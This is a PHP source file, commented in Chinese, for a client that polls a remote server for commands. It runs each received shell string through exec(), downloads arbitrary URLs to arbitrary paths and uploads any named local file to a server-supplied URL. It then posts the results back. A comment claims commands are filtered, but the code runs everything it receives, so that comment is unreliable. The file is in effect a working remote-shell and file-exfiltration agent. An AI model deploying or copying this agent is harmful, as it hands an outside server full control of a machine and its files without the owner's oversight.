<?php
include_once '../include/vendor.php';

/**
 * Created by PhpStorm.
 * User: HJKLI
 * Date: 2017/5/20
 * Time: 14:46
 *
 * 客户端连接
 */
class Client {

    protected $links;

    /**
     * @param number $links 申请链接的id
     */
    public function __construct($links) {

        set_time_limit(0);
        $handle      = fopen(urlServer . "service.php/" . $links, "rb");


        $this->links = $links;
        ob_start();
        $i = 1;
        while (!feof($handle)) {
            $contents = fread($handle, 8192);
            echo $contents;
            echo $i++."\n";
            $resolute = $this->resolution($contents);       // 解析

            // $resolute 为 FALSE 和 return 为1 时， 跳过改循环
            if (intval($resolute['return']) === 1 || empty($resolute)) {
                continue;
            }

            $runResult = $this->filtration($resolute); // 过滤掉不能执行的 shell, 并且执行shell

            $this->feedback($runResult, $resolute['interactz_id']);                // 发送数据

            flush(); //刷新并输出PHP缓冲数据
            ob_flush();
            sleep(1);
        }

        fclose($handle);
    }

    /*
     * 解析 数据流 , 验证数据完整，将数据流转换至 可过滤的数据
     */
    protected function resolution($contents) {
        $start = strpos($contents, '!!!###start');
        $end   = strrpos($contents, 'end###!!!');

        if ($start === false || $end === false) {
            return false;
        }

        $jData = json_decode(substr($contents, 11, bcsub($end, 11)), true);

        if (intval($jData['return']) === 0) {
            exit();
        } else {
            return $jData;
        }
    }

    /**
     * 过滤掉不能执行的 shell,
     * @param array $contents [type:"shell...", param => [..], ....]
     * @return false && [shell] && true
     */
    protected function filtration($contents) {
        switch ($contents['type']) {
            case 'shell':
                $result = $this->shell($contents['param']);
                break;
            case 'download':
                $result = $this->download($contents['param']);
                break;
            case 'upload':
                $result = $this->upload($contents['param']);
                break;
            default :
                $result = false;
        }

        return $result;

    }

    /**
     * 回馈， 将执行的 shell 的结果，加工 发送至server
     * @param array|string $send shell 的结果，上传的结果，下载的结果
     * @return true
     */
    protected function feedback($send, $resolute) {
        $curl = new curl();

        $post = $curl->post(urlServer . 'receive.php?interactz=' . $resolute, [
            'json' => $send,
        ]);

        $dePost = json_decode($post['body'], true);
        if (empty($dePost['return'])) {
            return false;
        }
        return true;
    }

    /*
     *  下载文件 shell 格式 download url path(默认客户端路径 )
     *  强制 下载文件必须要有 文件名称
     */
    protected function download($param) {
        $data = file_get_contents($param['url'], true);

//        $name     = substr(strrchr($param['url'], 47), 1); //获取文件名称
        $name     = basename($param['url']); //获取文件名称
        $downRoot = rootDir . '/download/' . $name;
        if (strlen($param['dir']) > 0) {
            $downRoot = $param['dir'];
        }

        $volume = file_put_contents($downRoot, $data);

        if (intval($volume) > 0) {
            return ['return' => 1, 'shell' => '下载'.$name.'成功!'];
        }
        return ['return' => 0, 'shell' => '下载'.$name.'失败!'];
    }

    /**
     * 上传文件
     * @param array $param 含有 两个 参数 file, url . file 指文件的路径，绝对路径， url, 默认 php 文件
     */
    protected function upload($param) {
        $curl = new curl();


        $file = $param['file'];
        $url  = strlen($param['url']) > 2 ? $param['url'] : urlServer . 'upload.php';

        $post = [
            'file' => @$file,
        ];

        $result = $curl->post($url, ['body' => $post]);

        $dePost = json_decode($result['body'], true);
        if (empty($dePost['return'])) {
            return ['return' => 1, 'shell' => '上传 '.$file.' 到 '.$url.'失败!'];
        }
        return ['return' => 1, 'shell' => '上传 '.$file.' 到 '.$url.'成功!'];
    }

    /*
     * 执行 shell
     */
    protected function shell($param) {
        $shell = $param['run'];

        exec($shell, $retval);

        // 针对 中午windows ASCII 转换为 utf8
        if (PHP_OS === 'WINNT') {
            foreach ($retval as &$val) {
                $val = iconv('GBK', 'UTF-8', $val);
            }
        }

        if (count($retval) > 3) {
            return ['return' => 1, 'shell' => $retval];
        }

        return ['return' => 0, 'shell' => $retval];
    }
}

new Client(32);